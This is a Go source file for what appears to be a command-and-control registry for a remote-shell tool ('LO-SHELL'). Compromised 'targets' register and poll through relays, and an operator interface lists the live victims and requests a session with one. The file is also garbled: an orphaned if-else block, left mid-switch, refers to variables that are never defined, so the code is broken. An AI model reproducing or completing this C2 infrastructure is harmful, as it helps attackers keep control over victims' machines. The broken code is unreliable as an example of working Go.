package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"
)

type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"`
	Listen   string `json:"listen"`
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

var (
	portMutex sync.Mutex
	nextPort  = 5001
	maxPort   = 6000
)

func getNextPort() int {
	portMutex.Lock()
	defer portMutex.Unlock()
	p := nextPort
	nextPort++
	if nextPort > maxPort {
		nextPort = 5001
	} // Loop back after 1,000 sessions
	return p
}

var (
	relayPool     []string
	clientLocs    = make(map[string]string)
	activeTargets = make(map[string]string) // TargetID -> SecretKey
	mu            sync.Mutex
	lastSeen      = make(map[string]time.Time)
)

func main() {
	rand.Seed(time.Now().UnixNano())
	ln, _ := net.Listen("tcp", ":8080")
	fmt.Println("==========================================")
	fmt.Println("   LO-SHELL MULTI-TENANT REGISTRY (v5)  ")
	fmt.Println("==========================================")

	for {
		conn, _ := ln.Accept()
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	conn.SetDeadline(time.Now().Add(5 * time.Second))
	defer conn.Close()

	var req AuthRequest
	if err := json.NewDecoder(conn).Decode(&req); err != nil {
		return
	}

	id := strings.ToUpper(req.TargetID)
	key := req.Key

	mu.Lock()         // THE ONLY LOCK YOU NEED
	defer mu.Unlock() // This ensures it unlocks no matter what happens

	switch req.Type {
	case "middle":
		relayPool = append(relayPool, req.Listen)
		fmt.Printf("[+] Relay Pooled: %s\n", req.Listen)

	case "client_register":
		// REMOVED NESTED LOCK
		activeTargets[id] = key
		lastSeen[id] = time.Now()
		fmt.Printf("[+++] TARGET %s ONLINE (Key: %s)\n", id, key)

	case "client_ready":
		if activeTargets[id] == req.Key {
			clientLocs[id] = req.Listen
			fmt.Printf("[*] %s PINNED -> %s\n", id, req.Listen)
		}

	case "cc_list":
		// REMOVED NESTED LOCK
		t := make([]string, 0)
		for tid, tkey := range activeTargets {
			if tkey == key && time.Since(lastSeen[tid]) < 60*time.Second {
				t = append(t, tid)
			}
		}
		json.NewEncoder(conn).Encode(t)

// When the TUI asks to talk to a specific TargetID
} else if req.Type == "cc_req" {
    uniquePort := getNextPort()
    relayAddr := fmt.Sprintf("127.0.0.1:%d", uniquePort)

    // 1. Store this address so when the Ghost polls, it knows where to go
    targets[req.TargetID].PendingAddr = relayAddr
    
    // 2. Tell the TUI to meet the Ghost on this UNIQUE port
    json.NewEncoder(c).Encode(RoutingInfo{RelayAddr: relayAddr})
	case "client_poll":
		if len(relayPool) > 0 {
			r := relayPool[rand.Intn(len(relayPool))]
			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: r})
		}
	}
}
